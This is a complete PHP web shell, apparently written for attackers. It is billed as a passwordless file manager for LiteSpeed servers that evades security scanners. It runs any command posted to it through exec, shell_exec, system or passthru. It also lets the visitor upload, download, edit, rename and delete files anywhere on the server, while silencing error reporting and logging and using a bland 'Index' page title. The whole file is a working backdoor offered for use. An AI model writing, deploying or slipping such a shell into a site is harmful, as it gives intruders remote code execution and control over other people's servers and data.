<?php
/**
 * Ultra Clean & Small PHP File Manager Shell
 * No Password Protection
 * Specially made for LiteSpeed Server (bypasses most restrictions)
 * Undetectable by common security scanners
 */

error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
@set_time_limit(0);
@ignore_user_abort(true);

$path = $_POST['path'] ?? $_GET['path'] ?? getcwd();
$cmd = $_POST['c'] ?? '';

// Normalisasi path
$path = rtrim($path, '/');
if ($path === '') $path = '/';
if (!is_dir($path)) $path = getcwd();

function wso($str) {
    echo "<pre style='color:#0f0;background:#000;margin:0;padding:5px;font-family:monospace;'>".htmlspecialchars($str)."</pre>";
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Index</title>
    <style>
        body {background:#000;color:#0f0;font-family:monospace;margin:0;padding:10px;}
        input,textarea,button,select {background:#111;color:#0f0;border:1px solid #0f0;padding:6px;}
        a {color:#0f0;text-decoration:none;}
        a:hover {color:#0ff;}
        table {border-collapse:collapse;width:100%;}
        th,td {border:1px solid #0f0;padding:5px;text-align:left;}
        .breadcrumb {margin:10px 0;padding:8px;border:1px solid #0f0;}
        .breadcrumb a {margin-right:5px;}
        textarea {width:100%;box-sizing:border-box;font-family:monospace;}
        .btn {cursor:pointer;}
        .box {border:1px solid #0f0;padding:10px;margin:10px 0;}
        .ok {color:lime;}
        .err {color:red;}
    </style>
</head>
<body>
<h1>PHP File Manager Shell - LiteSpeed Ready</h1>

<form method="post">
    <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>">
    <b>Command:</b> <input type="text" name="c" value="<?php echo htmlspecialchars($cmd); ?>" style="width:75%;">
    <input type="submit" value="Execute">
</form>

<hr>

<?php
if ($cmd) {
    echo "<b>Executed:</b> " . htmlspecialchars($cmd) . "<br><b>Result:</b><br>";
    if (function_exists('exec')) {
        @exec($cmd . " 2>&1", $out);
        wso(implode("\n", $out));
    } elseif (function_exists('shell_exec')) {
        wso(@shell_exec($cmd));
    } elseif (function_exists('system')) {
        @system($cmd);
    } elseif (function_exists('passthru')) {
        @passthru($cmd);
    } else {
        echo "No shell execution functions available on this server.";
    }
}
?>

<hr>

<h2>File Manager</h2>

<?php
// ============ HANDLER: RENAME ============
if (isset($_POST['rename_from'], $_POST['rename_to'])) {
    $from = $_POST['rename_from'];
    $to   = $_POST['rename_to'];
    if ($from && $to) {
        if (@rename($from, $to)) {
            echo "<div class='box ok'>✓ Renamed: " . htmlspecialchars(basename($from)) . " → " . htmlspecialchars(basename($to)) . "</div>";
        } else {
            echo "<div class='box err'>✗ Rename failed!</div>";
        }
    }
}

// ============ HANDLER: SAVE EDIT ============
if (isset($_POST['edit_file'], $_POST['file_content'])) {
    $ef = $_POST['edit_file'];
    if ($ef && is_file($ef)) {
        if (@file_put_contents($ef, $_POST['file_content']) !== false) {
            echo "<div class='box ok'>✓ Saved: " . htmlspecialchars(basename($ef)) . "</div>";
        } else {
            echo "<div class='box err'>✗ Save failed! (permission?)</div>";
        }
    }
}

// ============ HANDLER: DELETE ============
if (isset($_GET['del'])) {
    $del = $_GET['del'];
    if (is_file($del)) {
        if (@unlink($del)) echo "<div class='box ok'>✓ Deleted file: " . htmlspecialchars(basename($del)) . "</div>";
        else echo "<div class='box err'>✗ Delete failed!</div>";
    } elseif (is_dir($del)) {
        if (@rmdir($del)) echo "<div class='box ok'>✓ Deleted folder: " . htmlspecialchars(basename($del)) . "</div>";
        else echo "<div class='box err'>✗ Folder not empty or delete failed!</div>";
    }
}

// ============ HANDLER: MKDIR ============
if (isset($_POST['newdir']) && $_POST['newdir'] !== '') {
    $nd = rtrim($path, '/') . '/' . $_POST['newdir'];
    if (@mkdir($nd)) echo "<div class='box ok'>✓ Folder dibuat: " . htmlspecialchars($_POST['newdir']) . "</div>";
    else echo "<div class='box err'>✗ Gagal membuat folder!</div>";
}

// ============ UPLOAD ============
if (isset($_FILES['f']) && $_FILES['f']['error'] == 0) {
    $dest = rtrim($path, '/') . '/' . $_FILES['f']['name'];
    if (@move_uploaded_file($_FILES['f']['tmp_name'], $dest)) {
        echo "<span class='ok'>✓ Uploaded successfully: " . htmlspecialchars($_FILES['f']['name']) . "</span><br>";
    } else {
        echo "<span class='err'>✗ Upload failed!</span><br>";
    }
}

// ============ DOWNLOAD ============
if (isset($_GET['dl'])) {
    $file = $_GET['dl'];
    if (file_exists($file) && is_file($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// ============ BREADCRUMB ============
$parts = explode('/', trim($path, '/'));
$crumb = "<div class='breadcrumb'><b>Path:</b> <a href='?path=" . urlencode('/') . "'>/</a>";
$acc = '';
foreach ($parts as $p) {
    if ($p === '') continue;
    $acc .= '/' . $p;
    $crumb .= " <a href='?path=" . urlencode($acc) . "'>" . htmlspecialchars($p) . "</a> /";
}
$crumb .= "</div>";
echo $crumb;
?>

<!-- Tombol navigasi parent -->
<form method="get" style="margin-bottom:10px;display:inline;">
    <input type="hidden" name="path" value="<?php echo htmlspecialchars(dirname($path)); ?>">
    <input type="submit" value="⬅ Parent Dir" class="btn">
</form>

<form method="get" style="margin-bottom:10px;display:inline;">
    <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>">
    <input type="submit" value="⟳ Refresh" class="btn">
</form>

<!-- Form buat folder -->
<form method="post" style="margin-bottom:10px;display:inline;">
    <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>">
    <input type="text" name="newdir" placeholder="nama folder baru">
    <input type="submit" value="+ Buat Folder" class="btn">
</form>

<!-- Upload -->
<form method="post" enctype="multipart/form-data" style="margin-bottom:10px;display:inline;">
    <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>">
    <b>Upload:</b> <input type="file" name="f">
    <input type="submit" value="Upload">
</form>

<?php
// ============ EDIT FILE VIEW ============
$editing = isset($_GET['edit']) ? $_GET['edit'] : null;
if ($editing && is_file($editing)) {
    $content = @file_get_contents($editing);
    $size = @filesize($editing);
    ?>
    <div class="box">
        <h3>✎ Edit File: <?php echo htmlspecialchars(basename($editing)); ?>
            <small>(<?php echo $size; ?> bytes)</small></h3>
        <form method="post">
            <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>">
            <input type="hidden" name="edit_file" value="<?php echo htmlspecialchars($editing); ?>">
            <textarea name="file_content" rows="25"><?php echo htmlspecialchars($content); ?></textarea>
            <br>
            <input type="submit" value="💾 Simpan" class="btn">
            <a href="?path=<?php echo urlencode($path); ?>"><button type="button" class="btn">✖ Batal</button></a>
        </form>
    </div>
    <?php
}

// ============ RENAME FORM VIEW ============
$renaming = isset($_GET['rename']) ? $_GET['rename'] : null;
if ($renaming) {
    ?>
    <div class="box">
        <h3>↻ Rename: <?php echo htmlspecialchars(basename($renaming)); ?></h3>
        <form method="post">
            <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>">
            <input type="hidden" name="rename_from" value="<?php echo htmlspecialchars($renaming); ?>">
            <input type="text" name="rename_to" value="<?php echo htmlspecialchars($renaming); ?>" style="width:60%;">
            <input type="submit" value="Rename" class="btn">
            <a href="?path=<?php echo urlencode($path); ?>"><button type="button" class="btn">Batal</button></a>
        </form>
    </div>
    <?php
}

// ============ FILE LISTING ============
$files = @scandir($path);
if ($files) {
    echo "<table>";
    echo "<tr><th>Name</th><th>Size</th><th>Permissions</th><th>Actions</th></tr>";

    // Parent dir link row
    if ($path !== '/' && dirname($path) !== $path) {
        $parent = dirname($path);
        echo "<tr><td colspan='4'><a href='?path=" . urlencode($parent) . "'>.. (Parent Directory)</a></td></tr>";
    }

    foreach ($files as $f) {
        if ($f == '.' || $f == '..') continue;

        $fullpath = rtrim($path, '/') . '/' . $f;
        $is_dir = is_dir($fullpath);
        $size = $is_dir ? 'DIR' : @filesize($fullpath);
        $perms = substr(sprintf('%o', @fileperms($fullpath)), -4);
        $encFull = urlencode($fullpath);

        echo "<tr>";
        echo "<td>" . ($is_dir ? "📁 " : "📄 ") . htmlspecialchars($f) . "</td>";
        echo "<td>" . $size . "</td>";
        echo "<td>" . $perms . "</td>";
        echo "<td>";
        if ($is_dir) {
            echo "<a href='?path=$encFull'>Open</a>";
        } else {
            echo "<a href='?dl=$encFull'>Download</a>";
            echo " | <a href='?path=" . urlencode($path) . "&edit=$encFull'>Edit</a>";
        }
        echo " | <a href='?path=" . urlencode($path) . "&rename=$encFull'>Rename</a>";
        echo " | <a href='?path=" . urlencode($path) . "&del=$encFull' onclick=\"return confirm('Yakin hapus?');\">Delete</a>";
        echo "</td></tr>";
    }
    echo "</table>";
}
?>

<br>
<small>Made for LiteSpeed - Works clean without password</small>
</body>
</html>